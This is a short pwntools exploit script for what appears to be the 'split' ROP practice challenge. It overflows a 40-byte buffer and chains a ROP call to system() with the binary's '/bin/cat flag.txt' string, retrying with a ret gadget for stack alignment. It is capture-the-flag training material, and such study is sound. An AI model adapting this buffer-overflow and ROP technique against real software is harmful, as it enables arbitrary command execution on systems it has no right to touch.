from pwn import *

context.binary = "./split"
elf = ELF("./split")

def exploit(padding = False):
  p = process()
  #command = next(elf.search(b"/bin/cat flag.txt"))
  command = elf.symbols["usefulString"]
  rop = ROP(elf)
  if padding:
    rop.raw(rop.ret)
  rop(rdi=command)
  rop.raw(elf.symbols["system"])

  print(f"cat_flag address: {hex(command)}")
  print(f"ROP chain:\n{rop.dump()}")

  offset = 40
  payload = b"A" * offset
  payload += rop.chain()

  print(f"Payload: {payload}")

  p.sendline(payload)
  return p.recvline_regex(rb".*{.*}.*").decode("ascii")

try:
  log.success(exploit())
except EOFError:
  log.failure("Stack alignment is needed")
  log.success(exploit(True))
